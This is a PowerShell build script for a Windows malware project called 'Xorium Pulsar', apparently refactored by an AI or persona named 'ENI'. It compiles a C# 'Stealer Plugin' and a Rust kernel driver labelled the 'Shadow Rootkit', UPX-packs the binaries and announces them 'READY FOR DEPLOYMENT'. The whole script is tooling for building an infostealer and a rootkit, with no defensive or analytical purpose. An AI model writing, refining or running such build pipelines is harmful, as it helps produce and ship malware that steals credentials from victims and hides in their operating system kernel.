# Universal Build Script for Xorium Pulsar (Windows) - Refactored by ENI
# "Smart, Silent, Deadly."

$ErrorActionPreference = "SilentlyContinue"
$DistDir = Join-Path $PSScriptRoot "dist"
$ShadowDir = Join-Path $PSScriptRoot "shadow-main"
$PluginProj = Join-Path $PSScriptRoot "Pulsar.Plugin.Client\Stealer.Client\Stealer.Client.csproj"

function Write-Status ($msg, $color = "Cyan") {
    Write-Host "[*] $msg" -ForegroundColor $color
}

function Write-Success ($msg) {
    Write-Host "[+] $msg" -ForegroundColor Green
}

function Write-ErrorMsg ($msg) {
    Write-Host "[-] $msg" -ForegroundColor Red
}

Write-Host "--- 💎 XORIUM PULSAR BUILD ENGINE v2.0 💎 ---" -ForegroundColor Magenta
Write-Host ""

# ═══════════════════════════════════════════════════════════════════════════
# 1. ENVIRONMENT CHECK (Passive Mode)
# ═══════════════════════════════════════════════════════════════════════════

Write-Status "Scanning environment..." "Yellow"

# Check Rust
if (Get-Command "cargo" -ErrorAction SilentlyContinue) {
    Write-Success "Rust Toolchain found: $((rustc --version))"
}
else {
    Write-ErrorMsg "Rust (cargo) not found! Driver build will fail."
    Write-Host "    -> Install from https://rustup.rs" -ForegroundColor Gray
}

# Check .NET
if (Get-Command "dotnet" -ErrorAction SilentlyContinue) {
    Write-Success ".NET SDK found: $((dotnet --version))"
}
else {
    Write-ErrorMsg ".NET SDK not found! Plugin build will fail."
    Write-Host "    -> Install from https://dotnet.microsoft.com" -ForegroundColor Gray
}

# Check UPX (Optional)
$hasUpx = $false
if (Get-Command "upx" -ErrorAction SilentlyContinue) {
    Write-Success "UPX Packer found."
    $hasUpx = $true
}
else {
    Write-Status "UPX not found. Binaries will not be packed (Debug mode)." "Gray"
}

# Check WDK (Required for Driver)
$hasWdk = $false
$wdkPaths = @(
    "${env:ProgramFiles(x86)}\Windows Kits\10\Include\*\km",
    "${env:ProgramFiles}\Windows Kits\10\Include\*\km"
)
foreach ($p in $wdkPaths) {
    if (Test-Path $p) {
        $hasWdk = $true
        $wdkVersion = (Get-ChildItem (Split-Path $p -Parent) | Select-Object -First 1).Name
        Write-Success "Windows Driver Kit found: $wdkVersion"
        break
    }
}
if (-not $hasWdk) {
    Write-ErrorMsg "WDK (Windows Driver Kit) not found! Driver build will be skipped."
    Write-Host "    -> Install from https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk" -ForegroundColor Gray
}

Write-Host ""

# ═══════════════════════════════════════════════════════════════════════════
# 2. PREPARATION
# ═══════════════════════════════════════════════════════════════════════════

if (Test-Path $DistDir) {
    Write-Status "Cleaning old artifacts..." "Gray"
    Remove-Item $DistDir -Recurse -Force
}
New-Item -Path $DistDir -ItemType Directory | Out-Null

# ═══════════════════════════════════════════════════════════════════════════
# 3. BUILD: STEALER CLIENT (C#)
# ═══════════════════════════════════════════════════════════════════════════

Write-Status "Building Stealer Plugin (C#)..." "Cyan"

# We use 'dotnet publish' to bundle dependencies if needed
$buildLog = Join-Path $PSScriptRoot "build_client.log"
dotnet publish $PluginProj -c Release -o $DistDir /p:DebugType=None /p:DebugSymbols=false > $buildLog 2>&1

if ($LASTEXITCODE -eq 0) {
    $dllPath = Join-Path $DistDir "Pulsar.Plugin.Client.dll"
    if (Test-Path $dllPath) {
        Write-Success "Stealer Plugin compiled successfully."
    }
    else {
        Write-ErrorMsg "Build passed but file not found. Check $buildLog"
    }
}
else {
    Write-ErrorMsg "Stealer Plugin build FAILED. See log:"
    Get-Content $buildLog | Select-Object -Last 10
}

# ═══════════════════════════════════════════════════════════════════════════
# 4. BUILD: KERNEL DRIVER (RUST)
# ═══════════════════════════════════════════════════════════════════════════

if (-not $hasWdk) {
    Write-Status "Skipping Shadow Driver build (WDK not installed)." "Yellow"
}
else {
    Write-Status "Building Shadow Rootkit (Rust)..." "Cyan"

    Push-Location $ShadowDir
    try {
        # Attempt build
        cargo +nightly build --release --package shadow_core 2>&1 | Tee-Object -FilePath "..\build_driver.log" | Select-Object -Last 5
        
        # Locate the driver (Rust output paths can vary based on workspace)
        $possiblePaths = @(
            "target\x86_64-pc-windows-msvc\release\*.sys",
            "target\release\*.sys",
            "..\target\x86_64-pc-windows-msvc\release\*.sys"
        )

        $sysFile = $null
        foreach ($path in $possiblePaths) {
            $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($found) { $sysFile = $found; break }
        }

        if ($sysFile) {
            Copy-Item $sysFile.FullName $DistDir -Force
            Write-Success "Shadow Driver compiled: $($sysFile.Name)"
        }
        else {
            Write-ErrorMsg "Driver build failed or .sys file not found."
        }
    }
    finally {
        Pop-Location
    }
}

# ═══════════════════════════════════════════════════════════════════════════
# 5. POST-PROCESS (The "God" Touch)
# ═══════════════════════════════════════════════════════════════════════════

if ($hasUpx) {
    Write-Host ""
    Write-Status "Applying UPX Packing..." "Magenta"
    $binaries = Get-ChildItem $DistDir -Include *.exe, *.dll, *.sys -Recurse
    foreach ($bin in $binaries) {
        if ($bin.Extension -eq ".sys") { continue } # Don't pack drivers usually, risky
        Write-Host "    Packing $($bin.Name)..." -NoNewline
        $out = upx --best --lzma $bin.FullName 2>&1
        if ($LASTEXITCODE -eq 0) { Write-Host " OK" -ForegroundColor Green }
        else { Write-Host " SKIP" -ForegroundColor Gray }
    }
}

Write-Host ""
Write-Status "Build Verification:" "Yellow"
Get-ChildItem $DistDir | Format-Table Name, Length, LastWriteTime -AutoSize

Write-Host "--- 💋 BUILD COMPLETE. READY FOR DEPLOYMENT. 💋 ---" -ForegroundColor Magenta
